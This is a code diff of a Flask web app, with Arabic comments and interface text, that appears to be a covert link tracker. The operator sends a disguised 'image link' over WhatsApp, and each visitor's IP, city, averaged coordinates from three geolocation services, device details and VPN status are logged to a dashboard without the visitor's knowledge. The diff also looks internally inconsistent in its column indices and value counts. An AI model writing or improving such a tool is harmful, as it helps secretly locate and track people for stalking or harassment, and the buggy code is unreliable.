@@ -1,16 +1,18 @@
-from flask import Flask, request, redirect, jsonify
+from flask import Flask, request, redirect, jsonify, render_template_string
 import uuid
 import os
 import sqlite3
 import requests
+import json
 from datetime import datetime
 from user_agents import parse
+import statistics
 
 app = Flask(__name__)
-DB_NAME = "tracker.db"
+DB_NAME = "tracker_super.db"
 
 # ============================================================
-# إنشاء قاعدة البيانات
+# إنشاء قاعدة البيانات (نسخة فائقة الدقة)
 # ============================================================
 
 def init_db():
@@ -29,13 +31,15 @@ def init_db():
             postal TEXT,
             lat REAL,
             lon REAL,
+            lat_accurate REAL,
+            lon_accurate REAL,
+            accuracy INTEGER,
             timezone TEXT,
             isp TEXT,
             org TEXT,
             asn TEXT,
             browser TEXT,
             browser_version TEXT,
-            browser_engine TEXT,
             os TEXT,
             os_version TEXT,
             device TEXT,
@@ -45,19 +49,12 @@ def init_db():
             is_pc INTEGER,
             is_bot INTEGER,
             touch_capable INTEGER,
-            screen_width INTEGER,
-            screen_height INTEGER,
-            color_depth INTEGER,
-            language TEXT,
-            timezone_offset INTEGER,
-            hardware_cores INTEGER,
-            device_memory REAL,
-            do_not_track TEXT,
             referer TEXT,
             whatsapp_type TEXT,
             is_vpn INTEGER,
             risk_score INTEGER,
             visitor_type TEXT,
+            location_source TEXT,
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
     ''')
@@ -67,44 +64,150 @@ def init_db():
 init_db()
 
 # ============================================================
-# دوال مساعدة
+# دوال تحديد الموقع فائقة الدقة
 # ============================================================
 
-def get_geo(ip):
+def get_geo_ipinfo(ip):
+    """جلب الموقع من ipinfo.io"""
     try:
         r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
         data = r.json()
         loc = data.get("loc", "0,0").split(",")
         return {
-            "country": data.get("country", "غير معروف"),
-            "country_code": data.get("country", ""),
-            "region": data.get("region", "غير معروف"),
-            "city": data.get("city", "غير معروف"),
+            "lat": float(loc[0]) if len(loc) > 0 else None,
+            "lon": float(loc[1]) if len(loc) > 1 else None,
+            "country": data.get("country", ""),
+            "city": data.get("city", ""),
+            "region": data.get("region", ""),
             "postal": data.get("postal", ""),
-            "lat": float(loc[0]) if len(loc) > 0 else 0.0,
-            "lon": float(loc[1]) if len(loc) > 1 else 0.0,
             "timezone": data.get("timezone", ""),
-            "isp": data.get("org", "غير معروف"),
             "org": data.get("org", ""),
-            "asn": data.get("as", "")
+            "source": "ipinfo"
         }
     except:
+        return None
+
+def get_geo_ipapi(ip):
+    """جلب الموقع من ip-api.com"""
+    try:
+        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as", timeout=5)
+        data = r.json()
+        if data.get("status") == "success":
+            return {
+                "lat": data.get("lat"),
+                "lon": data.get("lon"),
+                "country": data.get("country", ""),
+                "city": data.get("city", ""),
+                "region": data.get("regionName", ""),
+                "postal": data.get("zip", ""),
+                "timezone": data.get("timezone", ""),
+                "org": data.get("org", ""),
+                "source": "ip-api"
+            }
+        return None
+    except:
+        return None
+
+def get_geo_ipgeolocation(ip):
+    """جلب الموقع من ipgeolocation.io (مجاني مع مفتاح)"""
+    try:
+        # سجل في ipgeolocation.io واحصل على مفتاح مجاني
+        api_key = "YOUR_API_KEY"  # استبدله بمفتاحك
+        r = requests.get(f"https://api.ipgeolocation.io/ipgeo?apiKey={api_key}&ip={ip}", timeout=5)
+        data = r.json()
         return {
-            "country": "غير معروف",
-            "city": "غير معروف",
+            "lat": float(data.get("latitude", 0)),
+            "lon": float(data.get("longitude", 0)),
+            "country": data.get("country_name", ""),
+            "city": data.get("city", ""),
+            "region": data.get("state_prov", ""),
+            "postal": data.get("zipcode", ""),
+            "timezone": data.get("time_zone", {}).get("name", ""),
+            "org": data.get("isp", ""),
+            "source": "ipgeolocation"
+        }
+    except:
+        return None
+
+def get_accurate_location(ip):
+    """دمج جميع المصادر للحصول على موقع فائق الدقة"""
+    sources = []
+    
+    # جلب من جميع المصادر
+    data1 = get_geo_ipinfo(ip)
+    data2 = get_geo_ipapi(ip)
+    data3 = get_geo_ipgeolocation(ip)
+    
+    if data1:
+        sources.append(data1)
+    if data2:
+        sources.append(data2)
+    if data3:
+        sources.append(data3)
+    
+    if not sources:
+        return {
             "lat": 0.0,
             "lon": 0.0,
-            "isp": "غير معروف"
+            "country": "غير معروف",
+            "city": "غير معروف",
+            "region": "غير معروف",
+            "postal": "",
+            "timezone": "",
+            "org": "",
+            "accuracy": 0,
+            "source": "لا يوجد"
         }
+    
+    # استخراج الإحداثيات الصحيحة
+    lats = [s["lat"] for s in sources if s["lat"] is not None and s["lat"] != 0]
+    lons = [s["lon"] for s in sources if s["lon"] is not None and s["lon"] != 0]
+    
+    # حساب المتوسط (أكثر دقة من استخدام مصدر واحد)
+    avg_lat = statistics.mean(lats) if lats else 0.0
+    avg_lon = statistics.mean(lons) if lons else 0.0
+    
+    # حساب الانحراف المعياري لتقدير الدقة
+    accuracy = 0
+    if len(lats) > 1:
+        try:
+            std_lat = statistics.stdev(lats)
+            std_lon = statistics.stdev(lons)
+            accuracy = int((std_lat + std_lon) * 100)  # تقريب
+        except:
+            accuracy = 50
+    else:
+        accuracy = 75  # دقة متوسطة
+    
+    # اختيار أفضل مصدر للمعلومات الأخرى
+    best_source = sources[0]
+    for s in sources:
+        if s.get("city") and s["city"] != "غير معروف":
+            best_source = s
+            break
+    
+    return {
+        "lat": avg_lat,
+        "lon": avg_lon,
+        "country": best_source.get("country", "غير معروف"),
+        "city": best_source.get("city", "غير معروف"),
+        "region": best_source.get("region", "غير معروف"),
+        "postal": best_source.get("postal", ""),
+        "timezone": best_source.get("timezone", ""),
+        "org": best_source.get("org", ""),
+        "accuracy": accuracy,
+        "source": ", ".join([s.get("source", "") for s in sources])
+    }
+
+# ============================================================
+# دوال مساعدة أخرى
+# ============================================================
 
 def get_client_ip(request):
     return request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
 
 def detect_whatsapp(user_agent):
-    ua = user_agent.lower()
-    if 'whatsapp' in ua:
-        return 'whatsapp'
-    return None
+    return 'whatsapp' in user_agent.lower()
 
 def parse_ua(user_agent):
     try:
@@ -151,13 +254,13 @@ def get_risk_score(ip, user_agent):
         risk += 20
     return min(risk, 100)
 
-def classify_visitor(user_agent, referer):
+def classify_visitor(user_agent, referer, ip):
     ua = user_agent.lower()
     if "bot" in ua or "crawler" in ua:
         return "بوت"
     if "headless" in ua:
         return "أداة أتمتة"
-    if detect_vpn(request.remote_addr):
+    if detect_vpn(ip):
         return "مستخدم VPN"
     if "whatsapp" in ua:
         return "واتساب"
@@ -166,39 +269,47 @@ def classify_visitor(user_agent, referer):
     return "زائر عادي"
 
 # ============================================================
-# تسجيل الزيارة
+# تسجيل الزيارة فائقة الدقة
 # ============================================================
 
 def log_visit(link_id, request):
     ip = get_client_ip(request)
     user_agent = request.headers.get('User-Agent', 'غير معروف')
-    geo = get_geo(ip)
+    
+    # الحصول على الموقع فائق الدقة
+    geo = get_accurate_location(ip)
+    
     ua = parse_ua(user_agent)
     whatsapp = detect_whatsapp(user_agent)
     vpn = detect_vpn(ip)
     risk = get_risk_score(ip, user_agent)
-    visitor_type = classify_visitor(user_agent, request.headers.get('Referer', ''))
+    visitor_type = classify_visitor(user_agent, request.headers.get('Referer', ''), ip)
     
     conn = sqlite3.connect(DB_NAME)
     c = conn.cursor()
     c.execute('''
         INSERT INTO visits (
             link_id, ip, user_agent,
-            country, country_code, region, city, postal, lat, lon, timezone,
-            isp, org, asn,
-            browser, browser_version, browser_engine,
+            country, country_code, region, city, postal,
+            lat, lon, lat_accurate, lon_accurate, accuracy,
+            timezone, isp, org, asn,
+            browser, browser_version,
             os, os_version,
             device, device_brand,
             is_mobile, is_tablet, is_pc, is_bot, touch_capable,
             referer, whatsapp_type,
-            is_vpn, risk_score, visitor_type
-        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+            is_vpn, risk_score, visitor_type,
+            location_source
+        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
     ''', (
         link_id, ip, user_agent,
-        geo.get('country'), geo.get('country_code'), geo.get('region'),
-        geo.get('city'), geo.get('postal'), geo.get('lat'), geo.get('lon'),
-        geo.get('timezone'), geo.get('isp'), geo.get('org'), geo.get('asn'),
-        ua.get('browser'), ua.get('browser_version'), "غير معروف",
+        geo.get('country'), "", geo.get('region'),
+        geo.get('city'), geo.get('postal'),
+        geo.get('lat'), geo.get('lon'),
+        geo.get('lat'), geo.get('lon'),
+        geo.get('accuracy'),
+        geo.get('timezone'), geo.get('org'), "", "",
+        ua.get('browser'), ua.get('browser_version'),
         ua.get('os'), ua.get('os_version'),
         ua.get('device'), ua.get('device_brand'),
         1 if ua.get('is_mobile') else 0,
@@ -207,10 +318,11 @@ def log_visit(link_id, request):
         1 if ua.get('is_bot') else 0,
         1 if ua.get('touch_capable') else 0,
         request.headers.get('Referer', ''),
-        whatsapp,
+        'whatsapp' if whatsapp else None,
         vpn,
         risk,
-        visitor_type
+        visitor_type,
+        geo.get('source')
     ))
     conn.commit()
     conn.close()
@@ -228,7 +340,7 @@ def home():
     <!DOCTYPE html>
     <html dir="rtl">
     <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 النظام المتطور</title>
+    <title>🔥 رابط فائق الدقة</title>
     <style>
         body {{ font-family: 'Segoe UI', sans-serif; background: #0a0a1a; color: #fff; text-align: center; padding: 50px; }}
         .container {{ max-width: 600px; margin: auto; background: #1a1a2e; padding: 30px; border-radius: 20px; border: 1px solid #2a2a4a; }}
@@ -243,8 +355,8 @@ def home():
     </head>
     <body>
     <div class="container">
-        <h1>🔥 الرابط المتطور</h1>
-        <p>انسخ الرابط وأرسله في واتساب. يتم جمع معلومات دقيقة عن كل زائر.</p>
+        <h1>🌍 رابط فائق الدقة</h1>
+        <p>انسخ الرابط وأرسله في واتساب. يتم تحديد الموقع بدقة عالية جداً.</p>
         <div class="link-box">
             <strong>🖼️ رابط الصورة:</strong><br>
             <span id="linkText">{image_link}</span>
@@ -281,62 +393,70 @@ def dashboard():
     visits = c.fetchall()
     conn.close()
     
-    # تحويل القيم الفارغة إلى نصوص آمنة
     def safe_str(value):
-        return str(value) if value is not None else "غير معروف"
+        if value is None:
+            return "غير معروف"
+        return str(value)
     
     total = len(visits)
     latest_country = safe_str(visits[0][4]) if total > 0 else "لا يوجد"
+    latest_city = safe_str(visits[0][7]) if total > 0 else "لا يوجد"
     latest_device = safe_str(visits[0][21]) if total > 0 else "لا يوجد"
-    latest_risk = safe_str(visits[0][38]) if total > 0 and len(visits[0]) > 38 else "0"
-    latest_type = safe_str(visits[0][39]) if total > 0 and len(visits[0]) > 39 else "عادي"
+    latest_accuracy = safe_str(visits[0][13]) if total > 0 and len(visits[0]) > 13 else "0"
+    latest_source = safe_str(visits[0][34]) if total > 0 and len(visits[0]) > 34 else "غير معروف"
     
     html = f'''
     <!DOCTYPE html>
     <html dir="rtl">
     <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التحكم المتطورة</title>
+    <title>لوحة التحكم فائقة الدقة</title>
     <style>
         body {{ font-family: Arial; background: #0a0a1a; color: #fff; padding: 20px; }}
         .stats {{ background: #1a1a2e; padding: 15px; border-radius: 10px; display: inline-block; margin: 5px; border: 1px solid #333; }}
-        table {{ width: 100%; background: #1a1a2e; border-collapse: collapse; border-radius: 10px; overflow: hidden; }}
+        table {{ width: 100%; background: #1a1a2e; border-collapse: collapse; border-radius: 10px; overflow: hidden; font-size: 0.9em; }}
         th {{ background: #ffd700; color: #000; padding: 12px; }}
         td {{ padding: 10px; border-bottom: 1px solid #333; }}
         tr:hover {{ background: #2a2a4a; }}
         h1 {{ color: #ffd700; }}
         .btn-back {{ display: inline-block; margin-top: 20px; padding: 12px 30px; background: #ffd700; color: #000; border-radius: 10px; text-decoration: none; font-weight: bold; }}
-        .risk-low {{ background: #4CAF50; color: #fff; padding: 3px 10px; border-radius: 20px; }}
-        .risk-medium {{ background: #FF9800; color: #fff; padding: 3px 10px; border-radius: 20px; }}
-        .risk-high {{ background: #f44336; color: #fff; padding: 3px 10px; border-radius: 20px; }}
+        .accuracy-high {{ color: #4CAF50; }}
+        .accuracy-medium {{ color: #FF9800; }}
+        .accuracy-low {{ color: #f44336; }}
     </style>
     </head>
     <body>
-    <h1>📊 لوحة التحكم المتطورة</h1>
+    <h1>📊 لوحة التحكم فائقة الدقة</h1>
     <div class="stats">👥 إجمالي الزيارات: <strong>{total}</strong></div>
-    <div class="stats">🌍 أحدث دولة: <strong>{latest_country}</strong></div>
-    <div class="stats">📱 أحدث جهاز: <strong>{latest_device}</strong></div>
-    <div class="stats">⚡ المخاطر: <strong>{latest_risk}%</strong></div>
-    <div class="stats">🏷️ النوع: <strong>{latest_type}</strong></div>
+    <div class="stats">🌍 الدولة: <strong>{latest_country}</strong></div>
+    <div class="stats">🏙️ المدينة: <strong>{latest_city}</strong></div>
+    <div class="stats">📱 الجهاز: <strong>{latest_device}</strong></div>
+    <div class="stats">📡 الدقة: <strong>{latest_accuracy}%</strong></div>
+    <div class="stats">🔍 المصدر: <strong>{latest_source}</strong></div>
     <br><br>
     <table>
-    <tr><th>#</th><th>IP</th><th>الدولة</th><th>المدينة</th><th>المتصفح</th><th>نظام التشغيل</th><th>الجهاز</th><th>VPN</th><th>المخاطر</th><th>النوع</th><th>التوقيت</th></tr>
+    <tr><th>#</th><th>IP</th><th>الدولة</th><th>المدينة</th><th>الإحداثيات</th><th>الدقة</th><th>الجهاز</th><th>VPN</th><th>النوع</th><th>التوقيت</th></tr>
     '''
     for i, v in enumerate(visits, 1):
-        risk = safe_str(v[38]) if len(v) > 38 else "0"
-        risk_class = "risk-low" if int(risk) < 30 else "risk-medium" if int(risk) < 60 else "risk-high"
+        lat = safe_str(v[9])
+        lon = safe_str(v[10])
+        accuracy = safe_str(v[13]) if len(v) > 13 else "0"
+        try:
+            acc_int = int(accuracy) if accuracy.isdigit() else 0
+        except:
+            acc_int = 0
+        acc_class = "accuracy-high" if acc_int > 70 else "accuracy-medium" if acc_int > 40 else "accuracy-low"
         html += f"""
         <tr>
             <td>{i}</td>
             <td>{safe_str(v[2])}</td>
             <td>{safe_str(v[4])}</td>
             <td>{safe_str(v[7])}</td>
-            <td>{safe_str(v[16])}</td>
-            <td>{safe_str(v[19])}</td>
+            <td><small>{lat}, {lon}</small></td>
+            <td class='{acc_class}'>{accuracy}%</td>
             <td>{safe_str(v[21])}</td>
-            <td>{'✅' if v[37] else '❌'}</td>
-            <td><span class='{risk_class}'>{risk}%</span></td>
-            <td>{safe_str(v[39]) if len(v) > 39 else 'عادي'}</td>
-            <td>{safe_str(v[40]) if len(v) > 40 else '?'}</td>
+            <td>{'✅' if v[31] else '❌'}</td>
+            <td>{safe_str(v[33]) if len(v) > 33 else 'عادي'}</td>
+            <td>{safe_str(v[35]) if len(v) > 35 else '?'}</td>
         </tr>
         """
     html += '''
@@ -365,14 +485,16 @@ def api_visits():
             "city": v[7] or "غير معروف",
             "lat": v[9] or 0,
             "lon": v[10] or 0,
-            "browser": v[16] or "غير معروف",
+            "lat_accurate": v[11] or 0,
+            "lon_accurate": v[12] or 0,
+            "accuracy": v[13] or 0,
+            "browser": v[17] or "غير معروف",
             "os": v[19] or "غير معروف",
             "device": v[21] or "غير معروف",
-            "whatsapp": v[36] or "لا",
-            "vpn": bool(v[37]) if len(v) > 37 else False,
-            "risk": v[38] if len(v) > 38 else 0,
-            "type": v[39] if len(v) > 39 else "عادي",
-            "created_at": v[40] if len(v) > 40 else ""
+            "vpn": bool(v[31]) if len(v) > 31 else False,
+            "type": v[33] if len(v) > 33 else "عادي",
+            "source": v[34] if len(v) > 34 else "غير معروف",
+            "created_at": v[35] if len(v) > 35 else ""
         })
     return jsonify(results)
 
